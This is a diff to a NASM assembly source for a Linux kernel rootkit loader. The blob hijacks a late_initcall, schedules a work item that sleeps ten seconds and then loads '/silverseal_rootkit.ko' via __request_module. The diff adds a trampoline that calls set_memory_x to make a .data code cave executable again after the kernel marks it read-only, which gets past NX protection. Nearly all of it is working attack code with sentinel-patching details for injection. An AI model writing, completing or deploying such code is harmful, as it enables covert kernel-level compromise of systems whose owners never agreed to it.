@@ -15,20 +15,25 @@
 ;   nasm -f bin -o lkm_loader.bin lkm_loader.asm
 ;
 ; Blob layout (offsets from blob start):
-;   [lkm_loader]        late_initcall entry — initialises work_struct,
-;                       calls schedule_work, tail-calls original initcall
-;   [lkm_worker]        work function — msleep(10000), then __request_module
-;   [work_struct_data]  32-byte struct work_struct (zeroed; patched at runtime)
-;   [path_buffer]       256-byte module path "/silverseal_rootkit.ko\0"
+;   [0]         lkm_loader (≤128 bytes) — late_initcall entry; initialises
+;                       work_struct with work.func = &lkm_worker_resume (.text),
+;                       calls schedule_work, tail-calls original initcall.
+;   [128]       lkm_worker — work function: msleep(10000), __request_module.
+;               (lkm_worker_resume in .text re-enables execution of this page
+;                before jumping here, so this code runs from an executable page.)
+;   [lkm_worker + sizeof(lkm_worker)]  work_struct_data — 32-byte struct
+;   [work_struct_data + 32]            path_buffer — 256-byte module path
 ;
 ; Sentinels (patched as i32 PC-relative offsets by Rust before writing blob):
+;   WORKER_RESUME_SENTINEL       0x11EEDDFF  disp32 in lea rax,[rip+d]
+;                                             → lkm_worker_resume_virt (.text)
 ;   SCHEDULE_WORK_REL_SENTINEL   0xAABBCCDD  rel32 in call schedule_work
 ;   ORIGINAL_FN_REL_SENTINEL     0x12345678  rel32 in jmp  original_initcall
 ;   MSLEEP_REL_SENTINEL          0x11AABBCC  rel32 in call msleep
 ;   REQUEST_MODULE_REL_SENTINEL  0xDDEEFF00  rel32 in call __request_module
 ;
-; RIP-relative LEA instructions for work_struct_data, lkm_worker, and
-; path_buffer are computed by NASM automatically — no sentinels needed.
+; RIP-relative LEA instructions for work_struct_data and path_buffer are
+; computed by NASM automatically — no sentinels needed for them.
 ;
 ; Debug: emits on COM1 (0x3F8):
 ;   'S' — lkm_loader entered
@@ -73,8 +78,13 @@ lkm_loader:
     lea     rax, [rdi + 8]             ; rax = &work.entry
     mov     [rdi + 8],  rax            ; entry.next = &entry  (self → list_empty == true)
     mov     [rdi + 16], rax            ; entry.prev = &entry
-    lea     rax, [lkm_worker]          ; rax = &lkm_worker (RIP-relative, NASM-computed)
-    mov     [rdi + 24], rax            ; work.func = &lkm_worker
+    ; work.func = &lkm_worker_resume (in .text — permanently executable).
+    ; After kernel_init() calls mark_readonly(), the .data cave becomes NX again.
+    ; lkm_worker_resume re-calls set_memory_x before jumping to lkm_worker here.
+    ; disp32 patched by Rust: lkm_worker_resume_virt - (loader_cave_virt + off + 4)
+    db      0x48, 0x8D, 0x05           ; REX.W LEA rax, [rip + disp32]
+    dd      0x11EEDDFF                  ; WORKER_RESUME_SENTINEL
+    mov     [rdi + 24], rax            ; work.func = &lkm_worker_resume
 
     ; ── schedule_work(&work_struct) ───────────────────────────────────────────
     ; rdi already = &work_struct; no other args needed.
@@ -94,10 +104,16 @@ lkm_loader:
     dd      0x12345678                  ; ORIGINAL_FN_REL_SENTINEL
 
 ; ── lkm_worker: kernel work function ────────────────────────────────────────
-; Called by the system workqueue. Sleeps 10 s then loads the rootkit module.
+; Called via lkm_worker_resume (.text trampoline) which re-enables execution
+; of this .data page before jumping here.  Sleeps 10 s then loads the module.
 ;
 ; Prototype (work_func_t):  void lkm_worker(struct work_struct *work)
-; On entry: rsp % 16 == 8  (kernel's workqueue called us as a normal function)
+; On entry: rsp % 16 == 8  (tail-called from lkm_worker_resume)
+;
+; Aligned to offset 128 from the blob start so Rust can compute its virtual
+; address as: lkm_worker_virt = loader_cave_virt + LKM_WORKER_IN_LOADER_OFFSET
+; (where LKM_WORKER_IN_LOADER_OFFSET = 128).
+align   128, db 0
 
 lkm_worker:
     push    rbp                         ; align rsp
